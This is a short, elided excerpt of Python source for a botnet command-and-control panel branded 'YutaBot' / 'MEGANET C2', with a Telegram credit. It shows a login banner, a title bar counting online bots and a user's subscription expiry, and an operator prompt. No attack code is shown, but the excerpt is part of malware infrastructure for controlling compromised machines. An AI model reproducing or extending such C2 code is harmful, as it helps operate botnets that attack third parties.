...
bannerLogin = '''
            ( Telegram : cahayaa878 )
               ( This Bot Yuta )
        Thank you for using MEGANET C2
'''
...
def handle_client(client, address):
    send(client, "\33]0;YutaBot C2 | Login\a")
    send(client, f'\x1bYutaBot C2 | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
...
def update_title(client, name, expires):
    while 1:
        try:
            send(client, f"\33]0;YutaBot C2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires} \a", False)
            time.sleep(0.6)
        except:
            client.close()
...
def command_line(client, username):
    ...
    prompt = f'{color("LIGHTBLSYN_EX")}({color("WHITE")}YutaBot{color("LIGHTBLSYN_EX")}@{color("CYAN")}{username}{color("LIGHTBLSYN_EX")}) > {color("LIGHTBLSYN_EX")}'
